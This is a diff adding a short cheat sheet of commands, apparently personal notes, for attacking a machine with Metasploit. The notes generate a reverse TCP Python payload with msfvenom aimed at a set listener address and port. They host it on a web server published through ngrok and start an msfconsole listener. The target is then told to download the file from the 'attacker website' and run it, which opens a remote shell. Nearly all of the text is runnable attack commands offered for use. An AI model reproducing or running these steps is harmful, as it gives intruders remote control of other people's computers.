@@ -1,0 +1,50 @@
+# help
+msfvenom --help
+
+# list payloads
+msfvenom --list payloads
+
+# check options
+msfvenom --payload your/select/payload_type --payload-options
+
+# save payload file
+msfvenom --payload your/select/payload_type LHOST=192.168.0.34 LPORT=4444 > rev_tcp.py
+
+# Copy file to your website dir
+cp rev_tcp.py /var/www/html/
+
+# Start your website
+ngrok http 80
+
+# Start msfconsole to attack
+msfconsole
+
+# Set payload type in msfconsole
+set PAYLOAD your/select/payload_type
+
+# Set lesting port in msfconsole
+set LPORT 4444
+
+# Set lesting ip in msfconsole
+set LHOST 192.168.0.34
+
+# Check your setting is correct in msfconsole
+show options
+
+# Start lesting in msfconsole
+exploit
+
+
+
+--- Go to target machine ---
+
+# Install payload file in attacker website
+http://your.addr/rev_tcp.py
+
+# Go to mac terminal
+
+# Start payload
+python rev_tcp.py
+
+
+----  Done -------
